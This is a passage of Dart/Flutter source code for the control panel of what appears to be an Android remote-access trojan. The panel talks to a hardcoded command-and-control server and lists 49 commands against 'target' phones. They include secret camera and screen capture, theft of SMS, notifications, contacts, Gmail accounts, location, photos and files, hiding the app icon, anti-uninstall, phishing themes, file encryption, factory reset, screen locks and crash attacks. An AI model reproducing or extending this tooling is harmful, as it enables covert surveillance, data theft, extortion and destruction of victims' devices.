import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

const String baseUrl = "https://hnzz.miuntech.my.id:2003";

enum LogType { info, success, warning, error }
enum TabIndex { devices, control, messages }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────
class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;

  const ControlPanelPage({super.key, this.device});

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> with SingleTickerProviderStateMixin {
  // ─── STATE ────────────────────────────────────────────────────────────
  TabIndex _currentTab = TabIndex.devices;
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  // ─── DATA DEVICES ──────────────────────────────────────────────────
  List<dynamic> _devices = [];
  String? _sessionKey;
  Timer? _pollingTimer;

  // ─── DATA PESAN (SMS & NOTIF) ──────────────────────────────────────
  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};

  // ─── STREAM CAMERA ──────────────────────────────────────────────────
  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();

  // ─── ANIMATION ──────────────────────────────────────────────────────
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  // ─── THEME ──────────────────────────────────────────────────────────
  final Color _primaryColor = const Color(0xFFB8B8CC);
  final Color _secondaryColor = const Color(0xFF787890);
  final Color _accentColor = const Color(0xFFD8D8EC);
  final Color _successColor = const Color(0xFF8899AA);
  final Color _warningColor = const Color(0xFFC8B890);
  final Color _darkBg = const Color(0xFF0C0C10);
  final Color _darkerBg = const Color(0xFF070709);
  final Color _surfaceColor = const Color(0xFF161620);
  final Color _cardColor = const Color(0xFF111118);
  final Color _glowColor1 = const Color(0xFFE0E0F8);
  final Color _glowColor2 = const Color(0xFF9090B4);
  final Color _glowColor3 = const Color(0xFFBBBBD0);
  final Color _goldColor = const Color(0xFFCCBB88);
  final Color _roseColor = const Color(0xFFBB8899);

  // ─── TILE ICON COLORS (dari design.html .ti-*) ──────────────────────
  static const Color _tiRed = Color(0xFFEF4444);
  static const Color _tiBlue = Color(0xFF3B82F6);
  static const Color _tiGreen = Color(0xFF22C55E);
  static const Color _tiPurple = Color(0xFFA855F7);
  static const Color _tiOrange = Color(0xFFF97316);
  static const Color _tiCyan = Color(0xFF06B6D4);
  static const Color _tiAmber = Color(0xFFF59E0B);
  static const Color _tiCam = Color(0xFF8B5CF6);
  static const Color _tiFlash = Color(0xFFEF4444);
  static const Color _tiEmerald = Color(0xFF10B981); // BLANK SCREEN bg
  static const Color _tiRed600 = Color(0xFFDC2626);  // COMBO LOCK / CRASH UI
  static const Color _tiSlate = Color(0xFF64748B);   // Spam Notifikasi bg

  // ─── CONTROLLERS ──────────────────────────────────────────────────
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();
  final TextEditingController _customExtraController = TextEditingController();

  // ─── STATE KONTROL ──────────────────────────────────────────────────
  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';
  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  // ─── CAMERA & SCREEN MODAL STATE ──────────────────────────────────────
  bool _cameraModalVisible = false;
  String _cameraFrame = '';
  String _cameraFacing = 'front';
  bool _cameraLoading = true;

  bool _screenshotResultVisible = false;
  String _screenshotFrame = '';
  String _screenshotFacing = 'front';
  double _screenshotScale = 1.0;
  double _screenshotOffsetX = 0.0;
  double _screenshotOffsetY = 0.0;

  bool _screenModalVisible = false;
  String _screenFrame = '';
  bool _screenLoading = true;

  // ─── LOADING CONTEXTS ──────────────────────────────────────────────
  BuildContext? _locationLoadingContext;
  BuildContext? _notifLoadingContext;

  // ─── GALLERY STATE ──────────────────────────────────────────────────
  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _isGalleryLoading = false;
  bool _galleryModalVisible = false;
  String _currentGalleryImage = '';
  int _currentGalleryIndex = 0;
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
  StreamController<List<Map<String, dynamic>>>.broadcast();

  // ─── CAMERA SOCKET STATE ──────────────────────────────────────────
  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;

  // ─── DEKLARASI DI ATAS initState ──────────────────────────────────────
  late List<Map<String, dynamic>> _controlItems;

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _loadTokenAndFetch();
    _initSocket();
    _initCameraStream();
    _startPolling();

    // ─── INISIALISASI KONTROL ITEMS ──────────────────────────────────
    // ══════════════════════════════════════════════════════════════════
    //  KONTROL ITEMS  —  sinkron dengan 49 tile pada design.html (.ctrl-tile)
    //  Urutan & label dipertahankan agar identik dengan dashboard HTML.
    // ══════════════════════════════════════════════════════════════════
    _controlItems = [
      // ── 1. OPEN APP ──
      {
        "label": "Open App",
        "icon": Icons.apps,
        "color": _tiBlue,
        "command": "openApp",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Package name (contoh: com.whatsapp)",
        "inputType": "text",
        "sub": "TAP › BUKA APLIKASI",
        "extra": "com.whatsapp",
      },
      // ── 2. BLANK SCREEN ──
      {
        "label": "BLANK SCREEN",
        "icon": Icons.desktop_windows,
        "color": _tiEmerald,
        "command": "blankScreenStart",
        "isToggle": true,
        "isOn": _deviceData['blankScreen'] ?? false,
        "needsInput": false,
        "offCommand": "blankScreenStop",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 3. LCD DAMAGE EFFECT ──
      {
        "label": "LCD DAMAGE EFFECT",
        "icon": Icons.broken_image,
        "color": _tiRed,
        "command": "lcdDamageShow",
        "isToggle": true,
        "isOn": _deviceData['lcdDamage'] ?? false,
        "needsInput": false,
        "offCommand": "lcdDamageHide",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 4. COMBO LOCK ──
      {
        "label": "COMBO LOCK",
        "icon": Icons.lock_clock,
        "color": _tiRed600,
        "command": "comboLockShow",
        "isToggle": true,
        "isOn": _deviceData['comboLock'] ?? false,
        "needsInput": false,
        "offCommand": "comboLockHide",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 5. FLASHLIGHT ──
      {
        "label": "Flashlight",
        "icon": Icons.flash_on,
        "color": _tiFlash,
        "command": "flashlight",
        "isToggle": true,
        "isOn": _deviceData['flashlight'] ?? false,
        "needsInput": false,
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 6. SCREEN CAPTURE ──
      {
        "label": "Screen Capture",
        "icon": Icons.screenshot_monitor,
        "color": _tiBlue,
        "command": "photoScreen",
        "isToggle": false,
        "needsInput": false,
        "sub": "○ KLIK UNTUK CAPTURE",
      },
      // ── 7. LOCK LOW (Lock Device) ──
      {
        "label": "Lock low",
        "icon": Icons.lock,
        "color": _tiRed,
        "command": "lockDevice",
        "isToggle": true,
        "isOn": _deviceData['deviceLocked'] ?? false,
        "needsInput": true,
        "inputHint": "PIN (kosongkan untuk default)",
        "inputType": "text",
        "sub": "● LOCKED / ○ OFF",
      },
      // ── 8. LOCK CUSTOM V2 ──
      {
        "label": "Lock Custom V2",
        "icon": Icons.lock_outline,
        "color": _tiPurple,
        "command": "lockCustom",
        "isToggle": true,
        "isOn": _isLockCustomActive,
        "needsInput": true,
        "inputHint": "HTML untuk tampilan kunci",
        "inputType": "multiline",
        "sub": "● LOCKED / ○ UNLOCKED",
      },
      // ── 9. KEYBOARD SPAM ──
      {
        "label": "Keyboard Spam",
        "icon": Icons.keyboard,
        "color": _tiOrange,
        "command": "keyboardSpamStart",
        "isToggle": true,
        "isOn": _deviceData['keyboardSpamActive'] ?? false,
        "needsInput": false,
        "offCommand": "keyboardSpamStop",
        "sub": "● SPAM / ○ NONAKTIF",
      },
      // ── 10. PERINGATAN DARURAT ──
      {
        "label": "Peringatan Darurat",
        "icon": Icons.warning_amber,
        "color": _tiRed,
        "command": "peringatanOn",
        "isToggle": true,
        "isOn": _deviceData['emergencyActive'] ?? false,
        "needsInput": false,
        "offCommand": "peringatanOff",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 11. TEMA PHISING ──
      {
        "label": "Tema Phising",
        "icon": Icons.color_lens,
        "color": _tiBlue,
        "command": "changeTheme",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Nama tema (whatsapp/instagram/etc)",
        "inputType": "text",
        "sub": "TAP › GANTI ICON",
        "extra": "whatsapp",
      },
      // ── 12. HIDE ICON ──
      {
        "label": "Hide Icon",
        "icon": Icons.visibility_off,
        "color": _tiOrange,
        "command": "hideIcon",
        "isToggle": true,
        "isOn": _deviceData['iconHidden'] ?? false,
        "needsInput": false,
        "sub": "● HIDDEN / ○ VISIBLE",
      },
      // ── 13. VIDEO OVERLAY ──
      {
        "label": "Video Overlay",
        "icon": Icons.video_settings,
        "color": _tiBlue,
        "command": "videoOverlay",
        "isToggle": true,
        "isOn": _isVideoOverlayActive,
        "needsInput": true,
        "inputHint": "URL video overlay",
        "inputType": "text",
        "offCommand": "videoOverlayHide",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 14. SPAM NOTIFIKASI ──
      {
        "label": "Spam Notifikasi",
        "icon": Icons.notifications_active,
        "color": _tiSlate,
        "command": "dialogSpam",
        "isToggle": true,
        "isOn": _isDialogSpamActive,
        "needsInput": true,
        "inputHint": "Teks spam dialog",
        "inputType": "text",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 15. STUCK LAYAR ──
      {
        "label": "Stuck Layar",
        "icon": Icons.touch_app,
        "color": _tiAmber,
        "command": "touchBlock",
        "isToggle": true,
        "isOn": _isTouchBlocked,
        "needsInput": true,
        "inputHint": "Durasi detik (0 = ∞)",
        "inputType": "number",
        "offCommand": "touchBlockStop",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 16. TEXT TO SPEECH ──
      {
        "label": "Text to Speech",
        "icon": Icons.record_voice_over,
        "color": _tiPurple,
        "command": "ttsSpeak",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks untuk diucapkan",
        "inputType": "text",
        "sub": "TAP › UCAPKAN TEKS",
        "extra": '{"text":"Halo, ini tes suara","lang":"id"}',
      },
      // ── 17. TAKE CAMERA (FRONT) ──
      {
        "label": "Take Camera",
        "icon": Icons.camera_front,
        "color": _tiCam,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
        "sub": "TAP › FOTO DEPAN",
      },
      // ── 18. TAKE CAMERA (BACK) ──
      {
        "label": "Take Camera",
        "icon": Icons.camera_rear,
        "color": _tiCam,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
        "sub": "TAP › FOTO BELAKANG",
      },
      // ── 19. FAKE CALL ──
      {
        "label": "Fake Call",
        "icon": Icons.call,
        "color": _tiPurple,
        "command": "fakeCall",
        "isToggle": true,
        "isOn": _deviceData['fakeCallActive'] ?? false,
        "needsInput": true,
        "inputHint": 'JSON {"name":"...","number":"..."}',
        "inputType": "text",
        "offCommand": "fakeCallStop",
        "sub": "● CALLING / ○ NONAKTIF",
      },
      // ── 20. JUMPSCARE V2 ──
      {
        "label": "Jumpscare V2",
        "icon": Icons.sentiment_very_dissatisfied,
        "color": _tiRed,
        "command": "jumpscare2Start",
        "isToggle": true,
        "isOn": _isJumpscare2Active,
        "needsInput": true,
        "inputHint": "URL gambar jumpscare",
        "inputType": "text",
        "offCommand": "jumpscare2Stop",
        "sub": "● FULLSCREEN / ○ NONAKTIF",
      },
      // ── 21. MUTE VOLUME ──
      {
        "label": "Mute Volume",
        "icon": Icons.volume_off,
        "color": _tiGreen,
        "command": "muteVolume",
        "isToggle": true,
        "isOn": _deviceData['volumeMuted'] ?? false,
        "needsInput": false,
        "sub": "● MUTED / ○ NORMAL",
      },
      // ── 22. VIBRATE ──
      {
        "label": "Vibrate",
        "icon": Icons.vibration,
        "color": _tiPurple,
        "command": "vibrate",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Durasi ms (contoh: 500)",
        "inputType": "number",
        "extra": "500",
        "sub": "TAP › GETAR DEVICE",
      },
      // ── 23. VIRUS ──
      {
        "label": "VIRUS",
        "icon": Icons.coronavirus,
        "color": _tiRed,
        "command": "virusOn",
        "isToggle": true,
        "isOn": _deviceData['virusActive'] ?? false,
        "needsInput": false,
        "offCommand": "virusOff",
        "sub": "● ON / ○ OFF",
      },
      // ── 24. SOS ──
      {
        "label": "SOS",
        "icon": Icons.sos,
        "color": _tiAmber,
        "command": "sosOn",
        "isToggle": true,
        "isOn": _deviceData['sosActive'] ?? false,
        "needsInput": false,
        "offCommand": "sosOff",
        "sub": "● ON / ○ OFF",
      },
      // ── 25. VIRUS V2 ──
      {
        "label": "VIRUS V2",
        "icon": Icons.bug_report,
        "color": _tiPurple,
        "command": "virusV2On",
        "isToggle": true,
        "isOn": _deviceData['virusV2Active'] ?? false,
        "needsInput": false,
        "offCommand": "virusV2Off",
        "sub": "● ON / ○ OFF",
      },
      // ── 26. JUMPSCARE V3 ──
      {
        "label": "JUMPSCARE V3",
        "icon": Icons.emoji_emotions,
        "color": _tiPurple,
        "command": "jumpscare3Start",
        "isToggle": true,
        "isOn": _deviceData['jumpscare3Active'] ?? false,
        "needsInput": false,
        "offCommand": "jumpscare3Stop",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 27. FAKE SYSTEM UPDATE ──
      {
        "label": "FAKE SYSTEM UPDATE",
        "icon": Icons.system_update,
        "color": _tiBlue,
        "command": "fakeUpdateOn",
        "isToggle": true,
        "isOn": _deviceData['fakeUpdateActive'] ?? false,
        "needsInput": false,
        "offCommand": "fakeUpdateOff",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 28. BRIGHTNESS CONTROL ──
      {
        "label": "BRIGHTNESS CONTROL",
        "icon": Icons.brightness_6,
        "color": _tiAmber,
        "command": "setBrightness",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Level 0 - 255 (contoh: 255)",
        "inputType": "number",
        "extra": "255",
        "sub": "TAP › SET BRIGHTNESS",
      },
      // ── 29. LIVE CAMERA ──
      {
        "label": "Live Camera",
        "icon": Icons.videocam,
        "color": _tiCam,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
        "sub": "○ LIVE / TAP › MULAI",
      },
      // ── 30. LIVE SCREEN ──
      {
        "label": "Live Screen",
        "icon": Icons.screen_share,
        "color": _tiCyan,
        "command": "screen",
        "isToggle": false,
        "needsInput": false,
        "extra": "start",
        "sub": "○ LIVE / TAP › MULAI",
      },
      // ── 31. LIVE SCREEN CONTROL ──
      {
        "label": "Live Screen Control",
        "icon": Icons.touch_app_outlined,
        "color": _tiCyan,
        "command": "openLiveControl",
        "isToggle": false,
        "needsInput": false,
        "sub": "○ LIVE / TAP › KONTROL",
      },
      // ── 32. GALERI ──
      {
        "label": "Galeri",
        "icon": Icons.photo_library,
        "color": _tiBlue,
        "command": "getGallery",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › LIHAT FOTO",
      },
      // ── 33. FILE MANAGER ──
      {
        "label": "File Manager",
        "icon": Icons.folder_open,
        "color": _tiOrange,
        "command": "getFiles",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › JELAJAH FILE",
      },
      // ── 34. KONTAK ──
      {
        "label": "Kontak",
        "icon": Icons.contacts,
        "color": _tiAmber,
        "command": "getContacts",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › LIHAT KONTAK",
      },
      // ── 35. GMAIL ──
      {
        "label": "Gmail",
        "icon": Icons.mail,
        "color": _tiRed,
        "command": "getGmail",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › LIHAT AKUN",
      },
      // ── 36. PHONE ──
      {
        "label": "Phone",
        "icon": Icons.phone_android,
        "color": _tiGreen,
        "command": "getPhone",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › LIHAT NOMOR",
      },
      // ── 37. GPS LOKASI ──
      {
        "label": "GPS Lokasi",
        "icon": Icons.location_on,
        "color": _tiGreen,
        "command": "getLocation",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › CEK LOKASI",
      },
      // ── 38. WALLPAPER ──
      {
        "label": "Wallpaper",
        "icon": Icons.wallpaper,
        "color": _tiPurple,
        "command": "setWallpaper",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL gambar wallpaper",
        "inputType": "text",
        "sub": "TAP › SET URL",
      },
      // ── 39. OPEN SITUS ──
      {
        "label": "Open Situs",
        "icon": Icons.public,
        "color": _tiGreen,
        "command": "openUrl",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL situs",
        "inputType": "text",
        "sub": "TAP › SET URL",
      },
      // ── 40. PLAY AUDIO ──
      {
        "label": "Play Audio",
        "icon": Icons.music_note,
        "color": _tiBlue,
        "command": "playAudio",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "URL audio",
        "inputType": "text",
        "sub": "TAP › SET URL",
      },
      // ── 41. TOAST MESSAGE ──
      {
        "label": "Toast Message",
        "icon": Icons.message,
        "color": _tiAmber,
        "command": "showToast",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Pesan toast",
        "inputType": "text",
        "extra": "Pesan dari ZENITH!",
        "sub": "TAP › KIRIM PESAN",
      },
      // ── 42. JUMPSCARE ──
      {
        "label": "Jumpscare",
        "icon": Icons.sentiment_very_dissatisfied,
        "color": _tiRed,
        "command": "jumpscareStart",
        "isToggle": true,
        "isOn": _isJumpscareActive,
        "needsInput": true,
        "inputHint": "URL gambar jumpscare",
        "inputType": "text",
        "offCommand": "jumpscareStop",
        "sub": "● AKTIF / ○ NONAKTIF",
      },
      // ── 43. BLOCK APP ──
      {
        "label": "Block App",
        "icon": Icons.block,
        "color": _tiRed,
        "command": "blockApp",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Package name (contoh: com.whatsapp)",
        "inputType": "text",
        "sub": "TAP › BLOKIR APP",
      },
      // ── 44. FACTORY RESET ──
      {
        "label": "FACTORY RESET",
        "icon": Icons.settings_backup_restore,
        "color": _tiBlue,
        "command": "factoryReset",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › RESET PABRIK",
      },
      // ── 45. ENKRIPSI FILE ──
      {
        "label": "🔒 ENKRIPSI FILE",
        "icon": Icons.enhanced_encryption,
        "color": _tiOrange,
        "command": "encryptFiles",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › KUNCI SEMUA FILE",
      },
      // ── 46. DEKRIPSI FILE ──
      {
        "label": "DEKRIPSI FILE",
        "icon": Icons.no_encryption_gmailerrorred,
        "color": _tiGreen,
        "command": "decryptFiles",
        "isToggle": false,
        "needsInput": false,
        "sub": "TAP › BUKA FILE TERKUNCI",
      },
      // ── 47. CRASH UI SYSTEM ──
      {
        "label": "CRASH UI SYSTEM",
        "icon": Icons.broken_image_outlined,
        "color": _tiRed600,
        "command": "crashUIStart",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Level DoS 1 - 10",
        "inputType": "number",
        "extra": "5",
        "sub": "TAP › DoS ATTACK LV 1-10",
      },
      // ── 48. LOCK CHAT V3 ──
      {
        "label": "LOCK CHAT V3",
        "icon": Icons.forum,
        "color": _tiCyan,
        "command": "lockChatStart",
        "isToggle": false,
        "needsInput": true,
        "inputHint": 'JSON {"title":"...","message":"..."}',
        "inputType": "text",
        "sub": "TAP › LOCK + LIVE CHAT",
      },
      // ── 49. WALLPAPER SPAM ──
      {
        "label": "WALLPAPER SPAM",
        "icon": Icons.wallpaper_outlined,
        "color": _tiOrange,
        "command": "wallpaperSpamStart",
        "isToggle": true,
        "isOn": _deviceData['wallpaperSpamActive'] ?? false,
        "needsInput": true,
        "inputHint": 'JSON {"urls":["...","..."],"interval":1000}',
        "inputType": "multiline",
        "offCommand": "wallpaperSpamStop",
        "sub": "TAP › RAPID WALLPAPER CYCLE",
      },
    ];

    // ─── LISTENER GALLERY STREAM ──────────────────────────────────────
    _galleryStreamController.stream.listen((photos) {
      if (mounted) {
        setState(() {
          _galleryPhotos = photos;
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        _addLog("🖼️ Gallery stream update: ${photos.length} foto", LogType.success);
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => GalleryFullscreenPage(
              targetId: _targetId,
              targetModel: _targetModel,
              galleryStream: _galleryStreamController.stream,
              onClose: _closeGalleryFullscreen,
              onRefresh: () {
                _sendCommand('getGallery');
                _addLog("🖼️ Refreshing gallery", LogType.info);
              },
              onDownload: _downloadScreenshot,
            ),
            fullscreenDialog: true,
          ),
        );
      }
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  Future<void> _loadTokenAndFetch() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = prefs.getString("key");
    if (_sessionKey != null) {
      _fetchDevices();
    }
  }

  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchDevices();
    });
  }

  Future<void> _fetchDevices() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
        headers: {"x-auth-token": _sessionKey!},
      );
      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
        });
      }
    } catch (e) {
      debugPrint("Fetch devices error: $e");
    }
  }

  // ─── SOCKET ──────────────────────────────────────────────────────────
  void _initSocket() {
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': _sessionKey ?? ''})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Sistem Kontrol Terhubung", LogType.success);
          _setupSocketListeners();

          // ── FIX: join sebagai controller ──────────────────────────────
          // Server HANYA mengenali panel lewat event `controller:join`, bukan
          // lewat query string. Tanpa emit ini, server menjawab `auth:error`
          // dan tidak pernah mengirim `devices:update`, sehingga daftar target
          // selalu kosong walaupun socket-nya "connected".
          socket!.emit('controller:join', {
            'token': _sessionKey ?? '',
            'id': 'ADMIN_PANEL',
            'type': 'admin',
          });
          _addLog("🔐 controller:join dikirim", LogType.info);
        }
      });

      // ── FIX: tangani auth:error dari server ─────────────────────────
      socket.on('auth:error', (data) {
        _addLog("❌ Auth ditolak: ${data['message'] ?? 'Unauthorized'}", LogType.error);
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    // ── DEVICES UPDATE ──
    socket.on('devices:update', (data) {
      if (mounted) {
        setState(() {
          _devices = List<dynamic>.from(data);
        });
      }
    });

    // ── SMS ──
    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _smsData = data; });
        _addLog("💬 SMS diterima", LogType.success);
        _showSmsData(data);
      }
    });

    // ── NOTIF ──
    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _notifData = data; });
        _addLog("🔔 Notifikasi diterima", LogType.success);
        _showNotifData(data);
      }
    });

    // ── CAMERA FRAME ──
    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);
        _addLog("📷 Camera frame received", LogType.info);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    // ── SCREEN FRAME ──
    socket.on('screen:frame', (data) {
      if (data['frame'] != null) {
        setState(() {
          _screenFrame = data['frame'];
          _screenLoading = false;
          _screenModalVisible = true;
        });
        _addLog("🖥️ Screen frame received", LogType.info);
      }
    });

    // ── COMMAND RESPONSE ──
    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 Response: $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart': setState(() => _isJumpscareActive = status == 'started'); break;
          case 'jumpscareStop': setState(() => _isJumpscareActive = false); break;
          case 'jumpscare2Start': setState(() => _isJumpscare2Active = status == 'started'); break;
          case 'jumpscare2Stop': setState(() => _isJumpscare2Active = false); break;
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'videoOverlay': setState(() => _isVideoOverlayActive = status == 'started'); break;
          case 'videoOverlayHide': setState(() => _isVideoOverlayActive = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'blockApp': if (data['package'] != null && !_blockedApps.contains(data['package'])) setState(() => _blockedApps.add(data['package'])); break;
          case 'unblockApp': setState(() => _blockedApps.remove(data['package'])); break;
          case 'unblockAll': setState(() => _blockedApps.clear()); break;
          // Update toggle states
          case 'lockDevice':
            if (data['status'] == 'locked' || data['status'] == true) {
              setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); });
            } else {
              setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            }
            break;
          case 'unlockDevice':
            setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            break;
          case 'hideIcon':
            setState(() {
              _deviceData['iconHidden'] = data['status'] == 'hidden';
              _updateControlItemState('hideIcon', data['status'] == 'hidden');
            });
            break;
          case 'muteVolume':
            setState(() {
              _deviceData['volumeMuted'] = data['status'] == 'muted';
              _updateControlItemState('muteVolume', data['status'] == 'muted');
            });
            break;
          case 'antiUninstall':
            setState(() {
              _isAntiUninstallActive = data['status'] == 'active';
              _updateControlItemState('antiUninstall', data['status'] == 'active');
            });
            break;
          case 'flashlight':
            setState(() {
              _deviceData['flashlight'] = data['status'] == 'on';
              _updateControlItemState('flashlight', data['status'] == 'on');
            });
            break;
          // ── WALLPAPER SPAM (status dikirim balik oleh target) ──
          case 'wallpaperSpamStart':
            setState(() {
              _deviceData['wallpaperSpamActive'] = data['wallpaperSpamActive'] == true;
              _updateControlItemState('wallpaperSpamStart', data['wallpaperSpamActive'] == true);
            });
            break;
          case 'wallpaperSpamStop':
            setState(() {
              _deviceData['wallpaperSpamActive'] = false;
              _updateControlItemState('wallpaperSpamStart', false);
            });
            break;
        }
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  // ─── LOGGING ──────────────────────────────────────────────────────────
  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 200) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _successColor;
      case LogType.error: return _roseColor;
      case LogType.warning: return _warningColor;
      default: return Colors.white70;
    }
  }

  // ─── COMMAND ──────────────────────────────────────────────────────────
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
